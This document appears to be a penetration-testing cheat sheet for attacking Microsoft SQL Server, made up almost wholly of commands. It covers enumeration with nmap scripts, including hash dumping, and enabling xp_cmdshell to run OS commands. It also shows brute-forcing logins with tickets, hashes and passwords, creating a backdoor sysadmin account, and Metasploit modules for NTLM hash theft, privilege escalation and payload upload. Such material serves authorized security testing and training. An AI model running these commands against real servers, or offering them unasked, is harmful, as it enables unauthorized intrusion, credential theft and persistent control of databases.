## NMAP ENUMERATION
```bash
# Basic
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info <target>

# More Scripts
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
```
## CONNECT - LOGIN
```bash
# Impacket-mssqlclient - Basic connection test
impacket-mssqlclient <user>:<password>@<target> -windows-auth

# mssql-cli
mssql-cli -S <target> -U <user> -P <password>
mssql-cli -S <server> -E   # uses Windows authentication

# sqsh
sqsh -S <target> -U <user> -P <password>
```
## DATABASE ENUMERATION
```bash
# Server Info
SELECT @@version;
SELECT name, database_id FROM sys.databases;

# Users and Login
SELECT name, type_desc FROM sys.server_principals;
SELECT name, type_desc FROM sys.database_principals;

# Roles
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_SRVROLEMEMBER('public');

# Current User Privileges
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```
## OS INTERACTION
```bash
# Check xp_cmdshell is enabled
EXEC sp_configure 'xp_cmdshell';

# How to Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';
```
## INSTALL AND USE MSSQL-CLI TOOL
```bash
# Setup Virtual Environment
python3 -m venv ~/venvs/mssqlcli
source ~/venvs/mssqlcli/bin/activate

# Install
python -m pip install --upgrade pip setuptools wheel
python -m pip install mssql-cli

# Usage 
mssql-cli -S <target> -U <user> -P <password>
mssql-cli -S <server> -E   # uses Windows authentication

# Decativate
deactivate
```
## MSSQLPwner 
```bash
# Tool
https://github.com/ScorpionesLabs/MSSqlPwner

# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

## BASIC ENUMERATION
```bash
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

#Enumerate links
enum_links
#Use a link
use_link [NAME]
```
## METASPLOIT ENUMERATION
```bash
msf> use auxiliary/scanner/mssql/mssql_ping

#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
## REFERENCE
```bash
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
```